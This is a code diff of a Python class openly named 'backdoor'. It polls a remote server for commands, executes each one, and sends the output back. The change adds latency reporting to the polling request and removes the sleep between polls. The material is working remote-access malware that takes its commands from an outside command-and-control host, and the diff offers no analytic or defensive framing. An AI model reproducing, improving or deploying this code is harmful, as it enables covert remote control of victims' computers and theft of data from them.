@@ -17,8 +17,8 @@ class backdoor:
         self.computer_id = r.json()
         return r.json()
     
-    def get_commands(self):
-        r = requests.get(self.url + f"computer/{self.computer_id}")
+    def get_commands(self, ping):
+        r = requests.post(self.url + f"computer/{self.computer_id}", json={'ping':ping})
         return r.json()['commands']
 
     def command_delete(self, command):
@@ -33,18 +33,17 @@ class backdoor:
         print(output)
         requests.put(self.url + f"computer/{self.computer_id}/output/", json={"output": output})
     def run(self):
-        x = 0
+        ping = ""
         while True:
             start = time.time()
-            commands = self.get_commands()
+            commands = self.get_commands(ping)
             end = time.time()
-            x += 1
-            print(f"{round((end-start)*1000,1)}ms {x} request")
+            ping = f"{round((end-start)*1000,2)}ms"
             for command in commands:
                 print(command)
                 self.command_run(command['name'])
                 self.command_delete(command)
-            time.sleep(0.1)
+            #time.sleep(0.1)
 
 
             
